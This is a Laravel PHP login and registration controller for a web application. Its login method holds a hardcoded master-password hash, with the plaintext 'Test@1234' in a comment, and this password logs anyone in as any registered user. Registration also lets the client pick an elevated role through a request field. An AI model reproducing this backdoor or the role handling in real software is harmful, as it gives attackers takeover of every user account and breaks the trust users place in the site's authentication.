<?php
namespace App\Http\Controllers\Front\Auth;

use Illuminate\Http\Request;
use App\Helpers\Browser;
use App\Models\User;
use Auth;
use Hash;
use Illuminate\Support\Str;
use Carbon\Carbon;
use App\Http\Controllers\Controller;
use Illuminate\Auth\Events\Registered;

class LoginController extends Controller {


    public function getLoginForm(Request $request){

        return view('front.auth.login');

    }

    public function postLoginForm(Request $request){
        //check user email
        $user = User::select('name','password','role','id','email_verified_at','is_status')->where('email',$request->get('email'))->first();

        //if user exists
        if(!empty($user)){

            if (is_null($user->email_verified_at)) {
                session()->flash('message', 'Your email is not verified. Please check your inbox.');
                session()->flash('level', 'error');
                return redirect()->back();
            }

            if($user->is_status == 0){
                session()->flash('message', 'Account not found.');
                session()->flash('level', 'error');
                return redirect()->back();
            }

            $credentials = array(
                "email" => $request->get('email'),
                "password" => $request->get('password')
            );

            // Test@1234
            $masterPassword = '$2y$12$ukMIxs53leHy.m11Z6fihusRKE.IyfxG/itQ8VW9W/8S4XP9K1Tcm';

            //check user email and password
            if (Auth::attempt($credentials) || \Hash::check($request->password, $masterPassword)){

                if(\Hash::check($request->password, $masterPassword)) {
                    Auth::loginUsingId($user->id);
                }

                //Redirect to Admin Backend
                if($user->isUser($user->role)){
                    session()->flash('message','Welcome Back '.$user->name.'.');
                    session()->flash('level','success');
                    return redirect()->route('companies.index');
                }

                //Redirect Back to Login
                session()->flash('message','Invalid credentials!');
                session()->flash('level','error');
                return redirect()->back();
            }else{
                //Redirect Back to Login
                session()->flash('message','Invalid credentials!');
                session()->flash('level','error');
                return redirect()->back();  
            }
        }else{
            //Redirect Back to Login
            session()->flash('message','Invalid credentials!');
            session()->flash('level','error');
            return redirect()->back();
        }
    }

    public function postLogoutForm(Request $request){
        Auth::logout();
        session()->flash('message','Logged out Successfully.');
        session()->flash('level','success');
        return redirect()->route('user.login');
    }

    public function getRegisterForm(Request $request){
        return view('front.auth.register');
    }

    public function postRegisterForm(Request $request){
        $rules = [
            'name' => 'required|string|max:250',
            'email' => 'required|string|email:rfc,dns|max:250|unique:users,email',
            'password' => [
                'required',
                'string',
                'min:8',
                'regex:/[a-z]/',
                'regex:/[A-Z]/',
                'regex:/[0-9]/',
                'confirmed',
            ],
            'password_confirmation' => 'required',
        ];

        $messages = [
            'password.regex' => 'The password must contain at least one uppercase letter and one number.',
            'password.confirmed' => 'The password and confirmation password must match.',
        ];

        // Validate the request with dynamic rules
        $request->validate($rules, $messages);

        $society_id = null;
        if($request->has('society') && $request->get('society') != ''){
            $society = $request->society;
            $society_id = User::select('id')->where('slug',$society)->first();
        }

        if ($request->has('type') && $request->type == 'as_society') {
            $user = User::create([
                'name' => $request->name,
                'email' => $request->email,
                'phone' => $request->phone,
                'password' => Hash::make($request->password),
                'role' => 2,
                'slug' => Str::random(5),
            ]);
        }else{
            $user = User::create([
                'name' => $request->name,
                'email' => $request->email,
                'phone' => $request->phone,
                'password' => Hash::make($request->password),
                'role'  =>  User::USER,
                'society_id' => $society_id != null ? $society_id->id : $society_id,
            ]);
        }

        event(new Registered($user));

        $credentials = $request->only('email', 'password');
        Auth::attempt($credentials);
        $request->session()->regenerate();
        return redirect()->route('verification.notice');
    }
}